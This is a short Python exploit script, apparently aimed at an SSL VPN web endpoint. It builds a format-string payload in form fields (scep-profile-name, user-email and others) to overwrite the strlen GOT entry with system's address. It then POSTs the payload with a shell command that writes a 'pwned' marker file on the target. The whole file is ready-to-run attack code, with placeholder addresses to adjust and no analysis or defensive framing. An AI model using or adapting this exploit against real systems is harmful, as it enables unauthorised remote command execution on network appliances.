#!/usr/bin/python

import requests
from pwn import *

# Prompt the user for the URL
url = input("Enter the URL: ")
cmd = "echo pwned > /var/appweb/sslvpndocs/hacked.txt" 

strlen_GOT = 0x667788  # change me
system_plt = 0x445566  # change me
   
fmt = '%70$n'    
fmt += '%' + str((system_plt >> 16) & 0xff) + 'c'
fmt += '%32$hn'   
fmt += '%' + str((system_plt & 0xffff) - ((system_plt >> 16) & 0xff)) + 'c'
fmt += '%24$hn'
for i in range(40, 60):
    fmt += '%' + str(i) + '$p'

data = "scep-profile-name="
data += p32(strlen_GOT).decode('latin-1')[:-1]
data += "&appauthcookie="
data += p32(strlen_GOT + 2).decode('latin-1')[:-1]
data += "&host-id="
data += p32(strlen_GOT + 4).decode('latin-1')[:-1]
data += "&user-email="
data += fmt
data += "&appauthcookie="
data += cmd

headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}
     
print(f"Data: {data}")

try:
    r = requests.post(url, data=data, headers=headers, timeout=10)
    print(f"Response: {r.text}")
except requests.exceptions.RequestException as e:
    print(f"Request failed: {e}")
